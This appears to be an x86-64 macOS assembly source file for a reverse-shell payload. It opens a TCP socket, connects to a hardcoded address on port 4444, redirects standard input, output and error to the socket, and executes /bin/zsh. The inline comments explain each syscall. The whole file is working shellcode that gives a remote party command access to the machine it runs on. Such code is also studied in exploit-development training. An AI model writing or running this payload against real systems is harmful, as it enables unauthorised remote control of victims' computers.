bits 64

global _main

_main:
   ; socket(AF_INET, SOCK_STREAM,0);
   PUSH 0x2             ; Store 0x2 on stack
   POP RDI              ; Pop this value into RDI -> AF_INET

   PUSH 0x1             ; Store 0x1 on stack
   POP RSI              ; Pop this value into RSI -> SOCK_STREAM

   XOR RDX,RDX          ; Null out RDX -> 0x00

   PUSH 97              ; socket() syscall - 97
   POP RAX
   BTS RAX,25
   SYSCALL

   MOV R9,RAX           ; Save socket fd in R9

   ; connect(sockt, (struct sockaddr *) &revsockaddr,sizeof(revsockaddr));
   MOV RDI,R9           ; RDI -> socket file descriptor

   ;; sockaddr
   XOR RSI,RSI          ; Null out RSI
   PUSH RSI             ; RSI -> sin_zero -> 0x0000000000000000

   MOV RSI,0xD08010AC5C110201 ; sin_addr=0xac1080d0 sin_port=0x115c, sin_family=0x02, sin_len=0x01
   DEC RSI              ; 0xD08010AC5C110201-0x01 -> 0xD08010AC5C110200 -> sin_len=0x00
   PUSH RSI             ; RSI (8 byte register) -> 0xD08010AC5C110200 
   
   PUSH RSP
   POP RSI              ; RSI = RSP = pointer to the structure we pushed previously

   ;; sizeof(addr)
   PUSH 0x10            ; Place 0x10 (16) on stack
   POP RDX              ; RDX -> sizeof struct -> 16 bytes -> 0x10

   ;; syscall connect()
   PUSH 98             ; connect() syscall - 98
   POP RAX
   BTS RAX,25
   SYSCALL


   ; dup2(connfd,i)
   MOV RDI,R9          ; RDI -> Socket file descriptor from R9
   PUSH 2
   POP RSI              ; RSI -> 2
dup2_loop:
   PUSH 90              ; dup2() syscall - 90
   POP RAX
   BTS RAX,25
   SYSCALL

   DEC RSI              ; Decrementing RSI by 1
   JNS dup2_loop        ; Jump back to dup2_loop if RSI>=0

   ; execve("/bin/zsh", "/bin/zsh", NULL);
   XOR RDX,RDX          ; RDX -> NULL

   PUSH RDX             ; Store NULL on stack
   MOV RBX,'/bin/zsh'   ; Store /bin/zsh in RBX
   PUSH RBX             ; Push it onto the stack
   MOV RDI,RSP          ; RDI -> /bin/zsh

   PUSH RDX             ; argv[1] -> NULL
   PUSH RDI             ; argv[0] -> /bin/zsh
   MOV RSI,RSP          ; Store {"/bin/zsh",NULL} in RSI

   PUSH 59              ; execve() syscall - 59
   POP RAX
   BTS RAX,25
   SYSCALL
